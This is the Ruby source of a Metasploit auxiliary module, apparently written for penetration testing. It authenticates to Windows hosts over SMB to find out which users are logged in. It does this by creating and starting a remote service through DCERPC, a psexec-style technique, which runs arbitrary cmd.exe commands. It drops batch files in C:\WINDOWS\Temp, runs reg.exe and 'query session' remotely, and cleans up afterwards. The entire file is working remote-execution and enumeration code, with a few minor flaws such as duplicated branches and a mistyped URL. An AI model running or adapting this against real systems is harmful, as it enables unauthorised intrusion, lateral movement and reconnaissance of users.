#!/usr/bin/env ruby

require 'msf/core'
class Metasploit3 < Msf::Auxiliary

	# Exploit mixins should be called first
	include Msf::Exploit::Remote::SMB
	include Msf::Exploit::Remote::SMB::Authenticated
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner
	include Msf::Exploit::Remote::DCERPC

	# Aliases for common classes
	SIMPLE = Rex::Proto::SMB::SimpleClient
	XCEPT  = Rex::Proto::SMB::Exceptions
	CONST  = Rex::Proto::SMB::Constants

	def initialize
		super(
			'Name'        => 'SMB - Query Logged On Users',
			'Version'     => '$Revision: 14976 $',
			'Description' => %Q{
				This module authenticates to a remote host or hosts and determines which users are currently logged in.  It uses reg.exe
				to query the HKU base registry key.
			},
			'Author'      =>
				[
					'Royce Davis <rdavis[at]accuvant.com>',    # Metasploit module
					'Twitter: <[at]R3dy__>',
				],
			'References'  => [
				['URL', 'http://www.pentestgeek.conm'],
				['URL', 'http://www.accuvant.com'],
			],
			'License'     => MSF_LICENSE
		)

		register_options([
			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
			OptString.new('USERNAME', [false, 'The name of a specific user to search for', '']),
			OptString.new('RPORT', [true, 'The Target port', 445]),
		], self.class)

		deregister_options('RHOST')
	end



	# This is the main controller function
	def run_host(ip)
		cmd = "C:\\WINDOWS\\SYSTEM32\\cmd.exe"
		bat = "C:\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
		text = "\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
		smbshare = datastore['SMBSHARE']

		#Try and authenticate with given credentials
		begin
			connect()
			smb_login()
		rescue StandardError => autherror
			print_error("#{ip} - #{autherror}")
			return
		end

		keys = get_hku(ip, smbshare, cmd, text, bat)
		if !keys
			cleanup_after(smbshare, ip, cmd, text, bat)
			return
		end
		keys.each do |key|
			check_hku_entry(key, ip, smbshare, cmd, text, bat)
		end
		cleanup_after(smbshare, ip, cmd, text, bat)
		disconnect()
	end



	# This method runs reg.exe query HKU to get a list of each key within the HKU master key
	# Returns an array object
	def get_hku(ip, smbshare, cmd, text, bat)
		begin
			# Try and query HKU
			command = "#{cmd} /C echo reg.exe QUERY HKU ^> C:#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
			simple.connect(smbshare)
			psexec(smbshare, command)
			output = get_output(ip, smbshare, text)
			cleanout = Array.new
			output.each_line { |line| cleanout << line.chomp if line.include?("HKEY") && line.split("-").size == 8 && !line.split("-")[7].include?("_")}
			return cleanout
		rescue StandardError => hku_error
			print_error("#{ip} - Error runing query against HKU. #{hku_error.class}. #{hku_error}")
			return nil
		end
	end



	# This method will retrive output from a specified textfile on the remote host
	def get_output(ip, smbshare, file)
		begin
			simple.connect("\\\\#{ip}\\#{smbshare}")
			outfile = simple.open(file, 'ro')
			output = outfile.read
			outfile.close
			simple.disconnect("\\\\#{ip}\\#{smbshare}")
			return output
		rescue StandardError => output_error
			print_error("#{ip} - Error getting command output. #{output_error.class}. #{output_error}.")
			return nil
		end
	end



	# This method checks a provided HKU entry to determine if it is a valid SID
	# Either returns nil or returns the name of a valid user
	def check_hku_entry(key, ip, smbshare, cmd, text, bat)
		begin
			key = key.split("HKEY_USERS\\")[1].chomp
			command = "#{cmd} /C echo reg.exe QUERY \"HKU\\#{key}\\Volatile Environment\" ^> C:#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
			simple.connect(smbshare)
			psexec(smbshare, command)
			if output = get_output(ip, smbshare, text)
				domain, username, dnsdomain = "","",""
				# Run this IF loop and only check for specified user if datastore['USERNAME'] is specified
				if datastore['USERNAME'].length > 0
					output.each_line do |line|
						username = line if line.include?("USERNAME")
						domain = line if line.include?("USERDOMAIN")
					end
					if domain.split(" ")[2].to_s.chomp + "\\" + username.split(" ")[2].to_s.chomp == datastore['USERNAME']
						print_good("#{datastore['USERNAME']} logged into #{ip}")
					end
					return
				end
				output.each_line do |line|
					domain = line if line.include?("USERDOMAIN")
					username = line if line.include?("USERNAME")
					dnsdomain = line if line.include?("USERDNSDOMAIN")
				end
				if username.length > 0 && domain.length > 0
					print_good("#{ip} - #{domain.split(" ")[2].to_s}\\#{username.split(" ")[2].to_s}")
				else
					if username = query_session(smbshare, ip, cmd, text, bat)
						print_good("#{ip} - #{dnsdomain.split(" ")[2].split(".")[0].to_s}\\#{username}")
					else
						print_status("#{ip} - Unable to determine user information for user: #{key}")
					end
				end
			else
				print_status("#{ip} - Could not determine logged in users")
			end
		rescue StandardError => check_error
			print_error("#{ip} - Error checking reg key. #{check_error.class}. #{check_error}")
			return check_error
		end
	end



	# Cleanup module.  Gets rid of .txt and .bat files created in the WINDOWS\Temp directory
	def cleanup_after(smbshare, ip, cmd, text, bat)
		begin
			# Try and do cleanup command
			cleanup = "#{cmd} /C del C:#{text} & del #{bat}"
			simple.connect(smbshare)
			print_status("Executing cleanup on host: #{ip}")
			psexec(smbshare, cleanup)
		rescue StandardError => cleanuperror
			print_error("Unable to processes cleanup commands: #{cleanuperror}")
			return cleanuperror
		end
	end



	# Method trys to use "query session" to determine logged in user
	def query_session(smbshare, ip, cmd, text, bat)
		begin
			command = "#{cmd} /C echo query session ^> C:#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
			simple.connect(smbshare)
			psexec(smbshare, command)
			userline = ""
			if output = get_output(ip, smbshare, text)
				output.each_line { |line| userline << line if line[0] == '>' }
			else
				return nil
			end
			return userline.split(" ")[1].chomp
		rescue
			return nil
		end
	end



	# This code was stolen straight out of psexec.rb.  Thanks very much HDM and all who contributed to that module!!
	# Instead of uploading and runing a binary.  This method runs a single windows command fed into the #{command} paramater
	def psexec(smbshare, command)
		filename = "filename"
		servicename = "servicename"
		simple.disconnect(smbshare)

		simple.connect("IPC$")

		handle = dcerpc_handle('367abb81-9844-35f1-ad32-98f038001003', '2.0', 'ncacn_np', ["\\svcctl"])
		vprint_status("Binding to #{handle} ...")
		dcerpc_bind(handle)
		vprint_status("Bound to #{handle} ...")

		vprint_status("Obtaining a service manager handle...")
		scm_handle = nil
		stubdata =
			NDR.uwstring("\\\\#{rhost}") +
			NDR.long(0) +
			NDR.long(0xF003F)
		begin
			response = dcerpc.call(0x0f, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				scm_handle = dcerpc.last_response.stub_data[0,20]
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		displayname = "displayname"
		holdhandle = scm_handle
		svc_handle  = nil
		svc_status  = nil

		stubdata =
			scm_handle +
			NDR.wstring(servicename) +
			NDR.uwstring(displayname) +

			NDR.long(0x0F01FF) + # Access: MAX
			NDR.long(0x00000110) + # Type: Interactive, Own process
			NDR.long(0x00000003) + # Start: Demand
			NDR.long(0x00000000) + # Errors: Ignore
			NDR.wstring( command ) +
			NDR.long(0) + # LoadOrderGroup
			NDR.long(0) + # Dependencies
			NDR.long(0) + # Service Start
			NDR.long(0) + # Password
			NDR.long(0) + # Password
			NDR.long(0) + # Password
			NDR.long(0)  # Password
		begin
			vprint_status("Attempting to execute #{command}")
			response = dcerpc.call(0x0c, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				svc_handle = dcerpc.last_response.stub_data[0,20]
				svc_status = dcerpc.last_response.stub_data[24,4]
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		vprint_status("Closing service handle...")
		begin
			response = dcerpc.call(0x0, svc_handle)
		rescue ::Exception
		end

		vprint_status("Opening service...")
		begin
			stubdata =
				scm_handle +
				NDR.wstring(servicename) +
				NDR.long(0xF01FF)

			response = dcerpc.call(0x10, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				svc_handle = dcerpc.last_response.stub_data[0,20]
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		vprint_status("Starting the service...")
		stubdata =
			svc_handle +
			NDR.long(0) +
			NDR.long(0)
		begin
			response = dcerpc.call(0x13, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		vprint_status("Removing the service...")
		stubdata =
			svc_handle +
			NDR.wstring("C:\\WINDOWS\\Temp\\sam")
		begin
			response = dcerpc.call(0x02, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
		end

		vprint_status("Closing service handle...")
		begin
			response = dcerpc.call(0x0, svc_handle)
		rescue ::Exception => e
			print_error("Error: #{e}")
		end

		begin
			#print_status("Deleting \\#{filename}...")
			select(nil, nil, nil, 1.0)
			#This is not really useful but will prevent double \\ on the wire :)
		if datastore['SHARE'] =~ /.[\\\/]/
			simple.connect(smbshare)
			simple.delete("C:\\WINDOWS\\Temp\\sam")
		else
			simple.connect(smbshare)
			simple.delete("C:\\WINDOWS\\Temp\\sam")
		end

		rescue ::Interrupt
			raise $!
		rescue ::Exception
			#raise $!
		end
		simple.disconnect("IPC$")
		simple.disconnect(smbshare)
	end

end
